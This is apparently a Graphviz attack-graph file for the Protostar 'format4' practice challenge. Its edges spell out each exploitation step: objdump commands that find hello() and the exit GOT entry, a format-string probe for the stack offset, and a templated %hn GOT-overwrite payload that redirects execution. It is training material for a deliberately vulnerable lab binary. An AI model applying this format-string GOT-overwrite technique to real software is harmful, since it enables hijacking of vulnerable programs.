digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Format Four"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="hello() address recovered"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="exit GOT entry recovered"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Stack offset for addresses identified"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="GOT-overwrite payload built"];
  node4 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution redirected to hello()"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -t /opt/protostar/bin/format4 | grep \" hello$\""];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -TR /opt/protostar/bin/format4 | grep \" exit\""];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"AAAA.%x.%x.%x.%x.%x.%x.%x.%x\"' | /opt/protostar/bin/format4"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"<exit_got><exit_got_plus_2>%<pad1>x%4$hn%<pad2>x%5$hn\"' > /tmp/format4.in"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format4 < /tmp/format4.in"];
}
